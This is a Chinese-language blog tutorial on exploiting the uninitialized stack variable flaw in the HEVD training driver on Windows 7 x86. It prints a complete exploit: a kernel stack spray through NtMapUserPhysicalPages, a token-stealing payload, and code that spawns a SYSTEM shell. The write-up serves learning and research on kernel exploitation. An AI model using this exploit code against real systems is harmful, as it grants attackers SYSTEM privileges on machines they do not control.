## **前言**

窥探Ring0漏洞世界：未初始化栈变量漏洞

上一篇探讨了空指针解引用漏洞的利用，这里来探讨另一种漏洞，未初始化栈变量漏洞，未初始化变量本身是没啥事的，但如果这个变量结构里存储了会拿出来执行的东西（回调函数啥的），那就是另一回事了。

实验环境：

•虚拟机：Windows 7 x86

•物理机：Windows 10 x64

•软件：IDA，Windbg，VS2022

#  **漏洞分析**

老样子，先IDA找到该漏洞的触发函数TriggerUninitializedMemoryStack，分析函数是如何存在漏洞的

首先是取出了用户提供的指针里的值，保存到ebx：

![](https://image.3001.net/images/20220721/1658377070_62d8d36ee143e14ca8da0.png!small)

然后紧接着判断该值是否为魔数0BAD0B0B0h，是的话，就将该值和一个函数地址保存到了栈中一个结构体里，如果不是的话，则不进行操作，然后进行判断，判断栈中的这个变量是否有值，如果有值，且为固定这个函数的地址的话，就执行这个函数。

![](https://image.3001.net/images/20220721/1658377088_62d8d380e64a53ea5ed00.png!small)

如果该位置有值，且不是固定函数地址的话，就去把这个值当函数去调用：

![](https://image.3001.net/images/20220721/1658377107_62d8d3936803dd3611c47.png!small)

驱动源码：

    
    
    ///
    
    
    /// Trigger the uninitialized memory in Stack Vulnerability
    ///
    
    ///The pointer to user mode buffer
    /// NTSTATUS
    NTSTATUS
    TriggerUninitializedMemoryStack(
    _In_ PVOID UserBuffer
    )
    {
    ULONG UserValue = 0;
    ULONG MagicValue = 0xBAD0B0B0;
    NTSTATUS Status = STATUS_SUCCESS;
    
    #ifdef SECURE
    //
    // Secure Note: This is secure because the developer is properly initializing
    // UNINITIALIZED_MEMORY_STACK to NULL and checks for NULL pointer before calling
    // the callback
    //
    
    UNINITIALIZED_MEMORY_STACK UninitializedMemory = { 0 };
    #else
    //
    // Vulnerability Note: This is a vanilla Uninitialized Memory in Stack vulnerability
    // because the developer is not initializing 'UNINITIALIZED_MEMORY_STACK' structure
    // before calling the callback when 'MagicValue' does not match 'UserValue'
    //
    
    UNINITIALIZED_MEMORY_STACK UninitializedMemory;
    #endif
    
    PAGED_CODE();
    
    __try
    {
    //
    // Verify if the buffer resides in user mode
    //
    
    ProbeForRead(UserBuffer, sizeof(UNINITIALIZED_MEMORY_STACK), (ULONG)__alignof(UCHAR));
    
    //
    // Get the value from user mode
    //
    
    UserValue = *(PULONG)UserBuffer;
    
    DbgPrint("[+] UserValue: 0x%p\n", UserValue);
    DbgPrint("[+] UninitializedMemory Address: 0x%p\n", &UninitializedMemory);
    
    //
    // Validate the magic value
    //
    
    if (UserValue == MagicValue) {
    UninitializedMemory.Value = UserValue;
    UninitializedMemory.Callback = &ampUninitializedMemoryStackObjectCallback
    }
    
    DbgPrint("[+] UninitializedMemory.Value: 0x%p\n", UninitializedMemory.Value);
    DbgPrint("[+] UninitializedMemory.Callback: 0x%p\n", UninitializedMemory.Callback);
    
    #ifndef SECURE
    DbgPrint("[+] Triggering Uninitialized Memory in Stack\n");
    #endif
    
    //
    // Call the callback function
    //
    
    if (UninitializedMemory.Callback)
    {
    UninitializedMemory.Callback();
    }
    }
    __except (EXCEPTION_EXECUTE_HANDLER)
    {
    Status = GetExceptionCode();
    DbgPrint("[-] Exception Code: 0x%X\n", Status);
    }
    
    return Status;
    }

可见，这里的安全版本和不安全版本的区别仅在是否初始化了局部变量，其实不初始化似乎也没啥问题，这里出问题的关键在于该变量中保存了回调函数，然后还被调用了，从而导致了漏洞。

如果输入的是错误的值（非魔数），且能控制回调地址，就能执行shellcode。

#  **漏洞利用**

​那么问题来了，要如何去控制回调地址呢？未初始化的局部变量会保存在栈中，且值是不可预测的，栈中存的是什么值那变量就是什么值。

参考[1]，控制栈中的值，需要做这些准备：

1.找到内核栈初始化地址；

2.找到回调地址所在内核栈初始化地址的偏移量；

3.通过在用户模式下用户可控输入喷射内核栈（参考资料[2]）。

#  **内核栈喷射**

根据参考资料[2]，有一个未文档化的函数NtMapUserPhysicalPages可以喷射一大块数据到内核栈里：

    
    
    NTSTATUS
    NtMapUserPhysicalPages (
    __in PVOID VirtualAddress,
    __in ULONG_PTR NumberOfPages,
    __in_ecount_opt(NumberOfPages) PULONG_PTR UserPfnArray
    )
    (...)
    ULONG_PTR StackArray[COPY_STACK_SIZE]; // COPY_STACK_SIZE = 1024

这里头有一片栈空间的缓冲区数组，大小是1024*sizeof(ULONG_PTR)

该函数最后，如果NumberOfPages变量不大于1024的话，会使用该栈缓冲区地址去调用：MiCaptureUlongPtrArray函数

    
    
    PoolArea = (PVOID)&StackArray[0];
    
    (...)
    
    if (NumberOfPages > COPY_STACK_SIZE) {
    PoolArea = ExAllocatePoolWithTag (NonPagedPool,
    NumberOfBytes,
    'wRmM');
    
    if (PoolArea == NULL) {
    return STATUS_INSUFFICIENT_RESOURCES;
    }
    }
    
    (...)
    
    Status = MiCaptureUlongPtrArray (PoolArea,
    UserPfnArray,
    NumberOfPages);

使用IDA打开Windows7 x86内核文件ntkrnlpa查找该调用：

![](https://image.3001.net/images/20220721/1658377140_62d8d3b4048903d1e6916.png!small)

因为该函数是fastcall调用，在x86下fastcall调用会优先使用ecx和edx传参，多余的参数才使用栈，也就是说传递的参数依次是：NumberOfPages，UserPfnArray，栈缓冲区的地址。

然后MiCaptureUlongPtrArray的实现如下：

    
    
    int __fastcall MiCaptureUlongPtrArray(int a1, unsigned int a2, void *a3)
    {
    size_t v3; // ecx
    
    v3 = 4 * a1;
    if ( v3 )
    {
    if ( (a2 & 3) != 0 )
    ExRaiseDatatypeMisalignment();
    if ( v3 + a2 > MmUserProbeAddress || v3 + a2 < a2 )
    *(_BYTE *)MmUserProbeAddress = 0;
    }
    memcpy(a3, (const void *)a2, v3);
    return 0;
    }

NtMapUserPhysicalPages函数里将往栈缓冲区里填充用户传来的数据。

到此，可以知道，只需要向调用NtMapUserPhysicalPages函数，提供第二个参数是大小，第三个参数是用户缓冲区，即可实现在栈中进行喷射，接下来进行编写exp实现利用。

#  **编写exp**

还是用之前的模板改一改，通过函数可以实现对内核栈的提前布置，然后再用非魔数的输入去调用漏洞函数，使得未初始化的变量里填充的是我们布置的值，从而完成利用：

    
    
    #include
    #include
    
    // Windows 7 SP1 x86 Offsets
    #define KTHREAD_OFFSET0x124 // nt!_KPCR.PcrbData.CurrentThread
    #define EPROCESS_OFFSET    0x050 // nt!_KTHREAD.ApcState.Process
    #define PID_OFFSET         0x0B4 // nt!_EPROCESS.UniqueProcessId
    #define FLINK_OFFSET       0x0B8 // nt!_EPROCESS.ActiveProcessLinks.Flink
    #define TOKEN_OFFSET       0x0F8 // nt!_EPROCESS.Token
    #define SYSTEM_PID         0x004 // SYSTEM Process PID
    
    typedef NTSTATUS(WINAPI* NtMapUserPhysicalPages_t)(IN PVOID         VirtualAddress,
    IN ULONG_PTR      NumberOfPages,
    IN OUT PULONG_PTR UserPfnArray);
    
    VOID TokenStealingPayloadWin7() {
    // Importance of Kernel Recovery
    __asm {
    pushad
    
    ;获取当前进程EPROCESS
    xor eax, eax
    mov eax, fs: [eax + KTHREAD_OFFSET]
    mov eax, [eax + EPROCESS_OFFSET]
    mov ecx, eax
    
    ;搜索system进程EPROCESS
    mov edx, SYSTEM_PID
    SearchSystemPID :
    mov eax, [eax + FLINK_OFFSET]
    sub eax, FLINK_OFFSET
    cmp[eax + PID_OFFSET], edx
    jne SearchSystemPID
    
    token窃取
    mov edx, [eax + TOKEN_OFFSET]
       mov[ecx + TOKEN_OFFSET], edx
    
    环境还原 + 返回
    popad
    }
    }
    
    int main()
    {
    
    ULONG UserBufferSize = 1024*sizeof(ULONG_PTR);
    PVOID EopPayload = &ampTokenStealingPayloadWin7
    
    HANDLE hDevice = ::CreateFileW(L"\\\\.\\HacksysExtremeVulnerableDriver", GENERIC_ALL, FILE_SHARE_WRITE, nullptr, OPEN_EXISTING, 0, nullptr);
    
    PULONG UserBuffer = (PULONG)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, UserBufferSize);
    
    //RtlFillMemory(UserBuffer, UserBufferSize, 'A');
    for (int i = 0; i < UserBufferSize / sizeof(ULONG_PTR); i++){
    UserBuffer[i] = (ULONG)EopPayload;
    }
    
    // 布置内核栈
    NtMapUserPhysicalPages_t     NtMapUserPhysicalPages;
    NtMapUserPhysicalPages = (NtMapUserPhysicalPages_t)GetProcAddress(GetModuleHandle(L"ntdll.dll"),"NtMapUserPhysicalPages");
    NtMapUserPhysicalPages(NULL, 1024, UserBuffer);
    
    
    ULONG WriteRet = 0;
    DeviceIoControl(hDevice, 0x22202f, (LPVOID)UserBuffer, UserBufferSize, NULL, 0, &WriteRet, NULL);
    
    HeapFree(GetProcessHeap(), 0, (LPVOID)UserBuffer);
    UserBuffer = NULL;
    
    system("pause");
    system("cmd.exe");
    
    return 0;
    }

# 截图演示

![](https://image.3001.net/images/20220721/1658377157_62d8d3c56100f93c786a6.png!small)

# 参考资料

•[1] Windows Kernel Exploitation Tutorial Part 6: Uninitialized Stack Variable
- rootkit (rootkits.xyz) https://rootkits.xyz/blog/2018/01/kernel-uninitialized-stack-variable/

•[2] nt!NtMapUserPhysicalPages and Kernel Stack-Spraying Techniques |
j00ru//vx tech blog (vexillium.org)
https://j00ru.vexillium.org/2011/05/windows-kernel-stack-spraying-techniques/

•[3] CVE-2016-0040 - DreamoneOnly - 博客园 (cnblogs.com)
https://www.cnblogs.com/DreamoneOnly/p/13163036.html

•[4] HEVD Kernel Exploitation -- Uninitialized Stack & Heap (seebug.org)
https://paper.seebug.org/200/

•[5] ヾ(Ő∀Ő3)ノ嘻嘻！[05] HEVD 内核漏洞之未初始化栈变量 | Saturn35
https://saturn35.com/2019/07/26/20190726-2/

•[6] C library function - memcpy() (tutorialspoint.com)
https://www.tutorialspoint.com/c_standard_library/c_function_memcpy.htm

•[7] __fastcall | Microsoft Docs https://docs.microsoft.com/zh-cn/cpp/cpp/fastcall?view=msvc-170

